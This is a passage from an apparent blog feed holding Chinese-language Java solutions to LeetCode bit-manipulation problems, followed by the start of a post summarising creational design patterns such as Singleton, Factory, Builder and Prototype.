class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">missingNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            res^=i^nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res^nums.length;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="4-只出现一次的元素"><a class="markdownIt-Anchor" href="#4-只出现一次的元素"></a> 4. 只出现一次的元素</h3><h4 id="思路-151"><a class="markdownIt-Anchor" href="#思路-151"></a> 思路</h4><p>  假设有一个数为x,那么则有如下规律：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0 ^ x &#x3D; x,</span><br><span class="line">x ^ x &#x3D; 0；</span><br><span class="line">x &amp; ~x &#x3D; 0,</span><br><span class="line">x &amp; ~0 &#x3D;x;</span><br></pre></td></tr></table></figure><p>  对于</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line">a = (a ^ num) &amp; ~b;</span><br><span class="line">b = (b ^ num) &amp; ~a;</span><br></pre></td></tr></table></figure><ol><li>初始状态：<code>a=0,b=0</code>;</li><li>x第一次出现后，<code>a=(a^x)&amp;~b=(0^x)&amp;~0=x</code>,<code>b=(b^x)&amp;~a=(0^x)&amp;~x=0</code>。</li><li>x第二次出现：<code>a=(a^x)&amp;~b=(x^x)&amp;~0=0</code>; <code>b=(b^x)&amp;~a=(0^x)&amp;~0=x</code>;</li><li>x第三次出现：<code>a=(a^x)&amp;~b=(0^x)&amp;~x=0</code>; <code>b=(b^x)&amp;~a=(x^x)&amp;~0=0</code>;所以出现三次同一个数，a和b最终都变回了0.</li><li>只出现一次的数，按照上面x第一次出现的规律可知<code>a=x,b=0</code>;因此最后返回a.</li></ol><h4 id="代码-149"><a class="markdownIt-Anchor" href="#代码-149"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">singleNumber</span><span class="params">(<span class="keyword">int</span>[] nums)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> a=<span class="number">0</span>,b=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            a=(a^nums[i])&amp;~b;</span><br><span class="line">            b=(b^nums[i])&amp;~a;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> a;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="5-数组中不重复的两个元素"><a class="markdownIt-Anchor" href="#5-数组中不重复的两个元素"></a> 5. 数组中不重复的两个元素</h3><p>  <a href="https://leetcode-cn.com/problems/single-number-iii/">https://leetcode-cn.com/problems/single-number-iii/</a></p><h4 id="思路-152"><a class="markdownIt-Anchor" href="#思路-152"></a> 思路</h4><p>  先全部异或一次,得到的结果就是这两个只出现一次的两个数的异或值， 考察其的某个非0位(比如最高非0位), 那么只出现一次的两个数中, 在这个位上一个为0, 一个为1, 由此可以将数组中的元素分成两部分,重新遍历, 求两个异或值。</p><h4 id="代码-150"><a class="markdownIt-Anchor" href="#代码-150"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] singleNumber(<span class="keyword">int</span>[] nums) &#123;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">            res=res^nums[i];</span><br><span class="line">        res=res&amp;(~res+<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">int</span> left=<span class="number">0</span>,right=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;nums.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>((nums[i]&amp;res)==<span class="number">0</span>)</span><br><span class="line">                left^=nums[i];</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">                right^=nums[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="keyword">int</span>[]&#123;left,right&#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="6-翻转一个数的比特位"><a class="markdownIt-Anchor" href="#6-翻转一个数的比特位"></a> 6. 翻转一个数的比特位</h3><h4 id="思路-153"><a class="markdownIt-Anchor" href="#思路-153"></a> 思路</h4><p>  移位进位</p><h4 id="代码-151"><a class="markdownIt-Anchor" href="#代码-151"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="comment">// you need treat n as an unsigned value</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">reverseBits</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">32</span>;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            res&lt;&lt;=<span class="number">1</span>;</span><br><span class="line">            res+=n&amp;<span class="number">1</span>;</span><br><span class="line">            n&gt;&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="额外内容"><a class="markdownIt-Anchor" href="#额外内容"></a> 额外内容</h4><p>  Integer.reverse()源码：</p><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">int</span> <span class="title">reverse</span><span class="params">(<span class="keyword">int</span> i)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// HD, Figure 7-1</span></span><br><span class="line">        i = (i &amp; <span class="number">0x55555555</span>) &lt;&lt; <span class="number">1</span> | (i &gt;&gt;&gt; <span class="number">1</span>) &amp; <span class="number">0x55555555</span>;<span class="comment">//第一步</span></span><br><span class="line">        i = (i &amp; <span class="number">0x33333333</span>) &lt;&lt; <span class="number">2</span> | (i &gt;&gt;&gt; <span class="number">2</span>) &amp; <span class="number">0x33333333</span>;<span class="comment">//第二步</span></span><br><span class="line">        i = (i &amp; <span class="number">0x0f0f0f0f</span>) &lt;&lt; <span class="number">4</span> | (i &gt;&gt;&gt; <span class="number">4</span>) &amp; <span class="number">0x0f0f0f0f</span>;<span class="comment">//第三步</span></span><br><span class="line">        i = (i &lt;&lt; <span class="number">24</span>) | ((i &amp; <span class="number">0xff00</span>) &lt;&lt; <span class="number">8</span>) |((i &gt;&gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xff00</span>) | (i &gt;&gt;&gt; <span class="number">24</span>);<span class="comment">//第四步</span></span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="7-判断一个数是不是-2-的-n-次方"><a class="markdownIt-Anchor" href="#7-判断一个数是不是-2-的-n-次方"></a> 7. 判断一个数是不是 2 的 n 次方</h3><p>  <a href="https://leetcode-cn.com/problems/power-of-two/">https://leetcode-cn.com/problems/power-of-two/</a></p><h4 id="思路-154"><a class="markdownIt-Anchor" href="#思路-154"></a> 思路</h4><p>  2的幂次的二进制一定是10000…，如果-1的话就变成了1111111…</p><h4 id="代码-152"><a class="markdownIt-Anchor" href="#代码-152"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfTwo</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (n&gt;<span class="number">0</span>)&amp;&amp;(n&amp;(n-<span class="number">1</span>))==<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="8-判断一个数是不是-4-的-n-次方"><a class="markdownIt-Anchor" href="#8-判断一个数是不是-4-的-n-次方"></a> 8. 判断一个数是不是 4 的 n 次方</h3><p>  <a href="https://leetcode-cn.com/problems/power-of-four/">https://leetcode-cn.com/problems/power-of-four/</a></p><h4 id="代码-153"><a class="markdownIt-Anchor" href="#代码-153"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfFour</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span>(num&lt;=<span class="number">0</span>)</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        res=num&amp;(num-<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">if</span>((res==<span class="number">0</span>)&amp;&amp;(num%<span class="number">3</span>==<span class="number">1</span>))</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="9-判断一个数的位级表示是否不会出现连续的-0-和-1"><a class="markdownIt-Anchor" href="#9-判断一个数的位级表示是否不会出现连续的-0-和-1"></a> 9. 判断一个数的位级表示是否不会出现连续的 0 和 1</h3><p>  <a href="https://leetcode-cn.com/problems/binary-number-with-alternating-bits/">https://leetcode-cn.com/problems/binary-number-with-alternating-bits/</a></p><h4 id="思路-155"><a class="markdownIt-Anchor" href="#思路-155"></a> 思路</h4><p>  如果一个数是满足条件的，那么一定是1010101…，如果将其右移一位，再和原数异或，就会得到11111111，把这个数+1就会得到100000并比原数多一位，再&amp;的话就会得到0。</p><h4 id="代码-154"><a class="markdownIt-Anchor" href="#代码-154"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">hasAlternatingBits</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> res=n^(n&gt;&gt;<span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> (res&amp;(res+<span class="number">1</span>))==<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="10-求一个数的补码"><a class="markdownIt-Anchor" href="#10-求一个数的补码"></a> 10. 求一个数的补码</h3><p>  <a href="https://leetcode-cn.com/problems/number-complement/">https://leetcode-cn.com/problems/number-complement/</a></p><h4 id="思路-156"><a class="markdownIt-Anchor" href="#思路-156"></a> 思路</h4><p>  加入这个数转换二进制一共有K位，那么就可以构造一个K位的111111…,然后两个数进行异或，就可以得到取反的数。</p><h4 id="代码-155"><a class="markdownIt-Anchor" href="#代码-155"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">findComplement</span><span class="params">(<span class="keyword">int</span> num)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> n=num;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span>(num&gt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            num&gt;&gt;=<span class="number">1</span>;</span><br><span class="line">            <span class="comment">//注意移位优先级低于算数运算符，要套括号</span></span><br><span class="line">            res=(res&lt;&lt;<span class="number">1</span>)+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res^n;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="11-实现整数的加法"><a class="markdownIt-Anchor" href="#11-实现整数的加法"></a> 11. 实现整数的加法</h3><p>  <a href="https://leetcode-cn.com/problems/sum-of-two-integers/">https://leetcode-cn.com/problems/sum-of-two-integers/</a></p><h4 id="思路-157"><a class="markdownIt-Anchor" href="#思路-157"></a> 思路</h4><p>  对于任意数<code>a,b</code>,<code>a^b</code>是其各位相加而不进行进位的结果，而<code>a&amp;b</code>得到了各位是否应该进位的情况。<br />  所以<code>a&amp;b&lt;&lt;1</code>就得到了各个位所需要的进位，再与<code>a^b</code>相加就完成了一轮进位，但是相加后可能还需要进位，所以一直递归调用，知道无需进位。</p><h4 id="代码-156"><a class="markdownIt-Anchor" href="#代码-156"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getSum</span><span class="params">(<span class="keyword">int</span> a, <span class="keyword">int</span> b)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> b==<span class="number">0</span>?a:getSum(a^b,(a&amp;b)&lt;&lt;<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="12-字符串数组最大乘积"><a class="markdownIt-Anchor" href="#12-字符串数组最大乘积"></a> 12. 字符串数组最大乘积</h3><p>  <a href="https://leetcode-cn.com/problems/maximum-product-of-word-lengths/">https://leetcode-cn.com/problems/maximum-product-of-word-lengths/</a></p><h4 id="思路-158"><a class="markdownIt-Anchor" href="#思路-158"></a> 思路</h4><p>  对于每一个字符串，我们用一个数二进制的26个位置来代表，如果出现了对应的字母就<code>|1&lt;&lt;(char-'a')</code>来构造一个对应位置的1。<br />  这样再遍历两个字符串，如果两个数的标志数组&amp;的结果是0，说明没有共同的位，然后再找最大值。</p><h4 id="代码-157"><a class="markdownIt-Anchor" href="#代码-157"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">maxProduct</span><span class="params">(String[] words)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] res=<span class="keyword">new</span> <span class="keyword">int</span>[words.length];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;words.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            String s=words[i];</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;s.length();j++)</span><br><span class="line">            &#123;</span><br><span class="line">                res[i] |=<span class="number">1</span>&lt;&lt;(s.charAt(j)-<span class="string">&#x27;a&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> max=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;words.length;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> j=i+<span class="number">1</span>;j&lt;words.length;j++)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span>((res[i]&amp;res[j])==<span class="number">0</span>)</span><br><span class="line">                    max=Math.max(max,words[i].length()*words[j].length());</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> max;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="13-统计从-0-~-n-每个数的二进制表示中-1-的个数"><a class="markdownIt-Anchor" href="#13-统计从-0-~-n-每个数的二进制表示中-1-的个数"></a> 13. 统计从 0 ~ n 每个数的二进制表示中 1 的个数</h3><p>  <a href="https://leetcode-cn.com/problems/counting-bits/">https://leetcode-cn.com/problems/counting-bits/</a></p><h4 id="思路-159"><a class="markdownIt-Anchor" href="#思路-159"></a> 思路</h4><p>  <code>i&amp;(i-1)</code>可以去掉i最右边的一个1（如果有），因此<code>i&amp;(i-1)</code>是比i小的，而且<code>i&amp;(i-1)</code>的1的个数已经在前面算过了，所以i的1的个数就是<code>i&amp;(i-1)</code>的1的个数加上1。<br />  所以动态转移方程为：<code>dp[i]=dp[i&amp;(i-1)]+1</code>。</p><h4 id="代码-158"><a class="markdownIt-Anchor" href="#代码-158"></a> 代码</h4><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">int</span>[] countBits(<span class="keyword">int</span> num) &#123;</span><br><span class="line">        <span class="keyword">int</span>[] res=<span class="keyword">new</span> <span class="keyword">int</span>[num+<span class="number">1</span>];</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">1</span>;i&lt;=num;i++)</span><br><span class="line">        &#123;</span><br><span class="line">            res[i]=res[i&amp;(i-<span class="number">1</span>)]+<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;  本篇文章主要记录来自CYC所推荐的200+LeetCode经典题目解题思路与题解。&lt;/p&gt;
&lt;p&gt;  &lt;a href=&quot;https://github.com/CyC2018/CS-Notes/blob/master/notes/Leetcode%20%E9%A2%98%</summary>
      
    
    
    
    <category term="算法" scheme="https://coder.lufer.cc/categories/%E7%AE%97%E6%B3%95/"/>
    
    
    <category term="Java" scheme="https://coder.lufer.cc/tags/Java/"/>
    
    <category term="算法" scheme="https://coder.lufer.cc/tags/%E7%AE%97%E6%B3%95/"/>
    
    <category term="数据结构" scheme="https://coder.lufer.cc/tags/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84/"/>
    
  </entry>
  
  <entry>
    <title>设计模式总结</title>
    <link href="https://coder.lufer.cc/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%80%BB%E7%BB%93/"/>
    <id>https://coder.lufer.cc/%E5%85%B6%E4%BB%96%E7%9F%A5%E8%AF%86/%E8%AE%BE%E8%AE%A1%E6%A8%A1%E5%BC%8F%E6%80%BB%E7%BB%93/</id>
    <published>2019-08-10T07:15:27.000Z</published>
    <updated>2021-04-06T02:19:37.165Z</updated>
    
    <content type="html"><![CDATA[<p>  From 《设计模式》(<a href="http://RUNOOB.com">RUNOOB.com</a>)</p><h1 id="一-创建型"><a class="markdownIt-Anchor" href="#一-创建型"></a> 一、创建型</h1><h2 id="1单例模式singleton-pattern"><a class="markdownIt-Anchor" href="#1单例模式singleton-pattern"></a> 1.单例模式(Singleton Pattern)</h2><h3 id="介绍"><a class="markdownIt-Anchor" href="#介绍"></a> 介绍</h3><p>  意图：保证一个类仅有一个实例，并提供一个访问它的全局访问点。</p><p>  主要解决：一个全局使用的类频繁地创建与销毁。</p><p>  何时使用：当您想控制实例数目，节省系统资源的时候。</p><p>  如何解决：判断系统是否已经有这个单例，如果有则返回，如果没有则创建。</p><p>  关键代码：构造函数是私有的。</p><p>  应用实例：</p><ol><li>一个班级只有一个班主任。</li><li>Windows 是多进程多线程的，在操作一个文件的时候，就不可避免地出现多个进程或线程同时操作一个文件的现象，所以所有文件的处理必须通过唯一的实例来进行。</li><li>一些设备管理器常常设计为单例模式，比如一个电脑有两台打印机，在输出的时候就要处理不能两台打印机打印同一个文件。</li></ol><p>  优点：</p><ol><li>在内存里只有一个实例，减少了内存的开销，尤其是频繁的创建和销毁实例（比如管理学院首页页面缓存）。</li><li>避免对资源的多重占用（比如写文件操作）。</li></ol><p>  缺点：<br />  没有接口，不能继承，与单一职责原则冲突，一个类应该只关心内部逻辑，而不关心外面怎么样来实例化。</p><p>  使用场景：</p><ol><li>要求生产唯一序列号。</li><li>WEB 中的计数器，不用每次刷新都在数据库里加一次，用单例先缓存起来。</li><li>创建的一个对象需要消耗的资源过多，比如 I/O 与数据库的连接等。</li></ol><h3 id="实现"><a class="markdownIt-Anchor" href="#实现"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/singleton_pattern_uml_diagram.jpg" alt="" /></p><h2 id="2简单工厂simple-factory-pattern"><a class="markdownIt-Anchor" href="#2简单工厂simple-factory-pattern"></a> 2.简单工厂(Simple Factory Pattern)</h2><p>  定义一个创建对象的接口，把实例操作放到简单工厂类，并由简单工厂类决定用哪个子类实例化。</p><h2 id="3工厂模式factory-pattern"><a class="markdownIt-Anchor" href="#3工厂模式factory-pattern"></a> 3.工厂模式(Factory Pattern)</h2><h3 id="介绍-2"><a class="markdownIt-Anchor" href="#介绍-2"></a> 介绍</h3><p>  意图：定义一个创建对象的接口，让其子类自己决定实例化哪一个工厂类，工厂模式使其创建过程延迟到子类进行。</p><p>  主要解决：主要解决接口选择的问题。</p><p>  何时使用：我们明确地计划不同条件下创建不同实例时。</p><p>  如何解决：让其子类实现工厂接口，返回的也是一个抽象的产品。</p><p>  关键代码：创建过程在其子类执行。</p><p>  应用实例：</p><ol><li>您需要一辆汽车，可以直接从工厂里面提货，而不用去管这辆汽车是怎么做出来的，以及这个汽车里面的具体实现。</li><li>Hibernate 换数据库只需换方言和驱动就可以。</li></ol><p>  优点：</p><ol><li>一个调用者想创建一个对象，只要知道其名称就可以了。</li><li>扩展性高，如果想增加一个产品，只要扩展一个工厂类就可以。</li><li>屏蔽产品的具体实现，调用者只关心产品的接口。</li></ol><p>  缺点：<br />  每次增加一个产品时，都需要增加一个具体类和对象实现工厂，使得系统中类的个数成倍增加，在一定程度上增加了系统的复杂度，同时也增加了系统具体类的依赖。这并不是什么好事。</p><p>  使用场景：</p><ol><li>日志记录器：记录可能记录到本地硬盘、系统事件、远程服务器等，用户可以选择记录日志到什么地方。</li><li>数据库访问，当用户不知道最后系统采用哪一类数据库，以及数据库可能有变化时。</li><li>设计一个连接服务器的框架，需要三个协议，“POP3”、“IMAP”、“HTTP”，可以把这三个作为产品类，共同实现一个接口。</li></ol><p>  注意事项：<br />  作为一种创建类模式，在任何需要生成复杂对象的地方，都可以使用工厂方法模式。有一点需要注意的地方就是复杂对象适合使用工厂模式，而简单对象，特别是只需要通过 new 就可以完成创建的对象，无需使用工厂模式。如果使用工厂模式，就需要引入一个工厂类，会增加系统的复杂度。</p><h3 id="实现-2"><a class="markdownIt-Anchor" href="#实现-2"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/factory_pattern_uml_diagram.jpg" alt="" /></p><h2 id="4抽象工厂abstract-factory-pattern"><a class="markdownIt-Anchor" href="#4抽象工厂abstract-factory-pattern"></a> 4.抽象工厂(Abstract Factory Pattern)</h2><h3 id="介绍-3"><a class="markdownIt-Anchor" href="#介绍-3"></a> 介绍</h3><p>  意图：提供一个创建一系列相关或相互依赖对象的接口，而无需指定它们具体的类。</p><p>  主要解决：主要解决接口选择的问题。</p><p>  何时使用：系统的产品有多于一个的产品族，而系统只消费其中某一族的产品。</p><p>  如何解决：在一个产品族里面，定义多个产品。</p><p>  关键代码：在一个工厂里聚合多个同类产品。</p><p>  应用实例：<br />  工作了，为了参加一些聚会，肯定有两套或多套衣服吧，比如说有商务装（成套，一系列具体产品）、时尚装（成套，一系列具体产品），甚至对于一个家庭来说，可能有商务女装、商务男装、时尚女装、时尚男装，这些也都是成套的，即一系列具体产品。假设一种情况（现实中是不存在的，要不然，没法进入共产主义了，但有利于说明抽象工厂模式），在您的家中，某一个衣柜（具体工厂）只能存放某一种这样的衣服（成套，一系列具体产品），每次拿这种成套的衣服时也自然要从这个衣柜中取出了。用 OOP 的思想去理解，所有的衣柜（具体工厂）都是衣柜类的（抽象工厂）某一个，而每一件成套的衣服又包括具体的上衣（某一具体产品），裤子（某一具体产品），这些具体的上衣其实也都是上衣（抽象产品），具体的裤子也都是裤子（另一个抽象产品）。</p><p>  优点：<br />  当一个产品族中的多个对象被设计成一起工作时，它能保证客户端始终只使用同一个产品族中的对象。</p><p>  缺点：<br />  产品族扩展非常困难，要增加一个系列的某一产品，既要在抽象的 Creator 里加代码，又要在具体的里面加代码。</p><p>  使用场景：</p><ol><li>QQ 换皮肤，一整套一起换。</li><li>生成不同操作系统的程序。</li></ol><p>  注意事项：<br />  产品族难扩展，产品等级易扩展。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">    client&#x3D;&gt;operation: 客户类</span><br><span class="line">abfactory&#x3D;&gt;operation: 抽象工厂</span><br><span class="line">factoryA&#x3D;&gt;operation: 工厂A</span><br><span class="line">factoryB&#x3D;&gt;operation: 工厂B</span><br><span class="line">factoryC&#x3D;&gt;operation: ......</span><br><span class="line">target&#x3D;&gt;operation:目标子类</span><br><span class="line">    </span><br><span class="line">client-&gt;abfactory</span><br><span class="line">abfactory-&gt;factoryA-&gt;target</span><br><span class="line">abfactory-&gt;factoryB</span><br><span class="line">abfactory-&gt;factoryC</span><br></pre></td></tr></table></figure><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/abstractfactory_pattern_uml_diagram.jpg" alt="" /></p><h2 id="5建造者生成器模式builder-pattern"><a class="markdownIt-Anchor" href="#5建造者生成器模式builder-pattern"></a> 5.建造者(生成器)模式(Builder Pattern)</h2><h3 id="介绍-4"><a class="markdownIt-Anchor" href="#介绍-4"></a> 介绍</h3><p>  意图：<br />  将一个复杂的构建与其表示相分离，使得同样的构建过程可以创建不同的表示。</p><p>  主要解决：<br />  主要解决在软件系统中，有时候面临着&quot;一个复杂对象&quot;的创建工作，其通常由各个部分的子对象用一定的算法构成；由于需求的变化，这个复杂对象的各个部分经常面临着剧烈的变化，但是将它们组合在一起的算法却相对稳定。</p><p>  何时使用：一些基本部件不会变，而其组合经常变化的时候。</p><p>  如何解决：将变与不变分离开。</p><p>  关键代码：建造者：创建和提供实例，导演：管理建造出来的实例的依赖关系。</p><p>  应用实例：</p><ol><li>去肯德基，汉堡、可乐、薯条、炸鸡翅等是不变的，而其组合是经常变化的，生成出所谓的&quot;套餐&quot;。</li><li>JAVA 中的 StringBuilder。</li></ol><p>  优点：</p><ol><li>建造者独立，易扩展。</li><li>便于控制细节风险。</li></ol><p>  缺点：</p><ol><li>产品必须有共同点，范围有限制。</li><li>如内部变化复杂，会有很多的建造类。</li></ol><p>  使用场景：</p><ol><li>需要生成的对象具有复杂的内部结构。</li><li>需要生成的对象内部属性本身相互依赖。</li></ol><p>  注意事项：<br />  与工厂模式的区别是：建造者模式更加关注与零件装配的顺序。</p><h3 id="实现-3"><a class="markdownIt-Anchor" href="#实现-3"></a> 实现</h3><p><img src="https://www.runoob.com/wp-content/uploads/2014/08/builder_pattern_uml_diagram.jpg" alt="" /></p><h2 id="6原型模式prototype-pattern"><a class="markdownIt-Anchor" href="#6原型模式prototype-pattern"></a> 6.原型模式(Prototype Pattern)</h2><h3 id="介绍-5"><a class="markdownIt-Anchor" href="#介绍-5"></a> 介绍</h3><p>  意图：用原型实例指定创建对象的种类，并且通过拷贝这些原型创建新的对象。</p><p>  主要解决：在运行期建立和删除原型。</p><p>  何时使用：</p><ol><li>当一个系统应该独立于它的产品创建，构成和表示时。</li><li>当要实例化的类是在运行时刻指定时，例如，通过动态装载。</li><li>为了避免创建一个与产品类层次平行的工厂类层次时。</li><li>当一个类的实例只能有几个不同状态组合中的一种时。建立相应数目的原型并克隆它们可能比每次用合适的状态手工实例化该类更方便一些。</li></ol><p>  如何解决：<br />  利用已有的一个原型对象，快速地生成和原型对象一样的实例。</p><p>  关键代码：</p><ol><li>实现克隆操作，在 JAVA 继承 Cloneable，重写 clone()，在 .NET 中可以使用 Object 类的 MemberwiseClone() 方法来实现对象的浅拷贝或通过序列化的方式来实现深拷贝。</li><li>原型模式同样用于隔离类对象的使用者和具体类型（易变类）之间的耦合关系，它同样要求这些&quot;易变类&quot;拥有稳定的接口。</li></ol><p>  应用实例：</p><ol><li>细胞分裂。</li><li>JAVA 中的 Object clone() 方法。</li></ol><p>  优点：</p><ol><li>性能提高。</li><li>逃避构造函数的约束。</li></ol><p>  缺点：</p><ol><li>配备克隆方法需要对类的功能进行通盘考虑，这对于全新的类不是很难，但对于已有的类不一定很容易，特别当一个类引用不支持串行化的间接对象，或者引用含有循环结构的时候。</li><li>必须实现 Cloneable 接口。</li></ol><p>  使用场景：</p><ol><li>资源优化场景。</li><li>类初始化需要消化非常多的资源，这个资源包括数据、硬件资源等。</li><li>性能和安全要求的场景。</li><li>通过 new 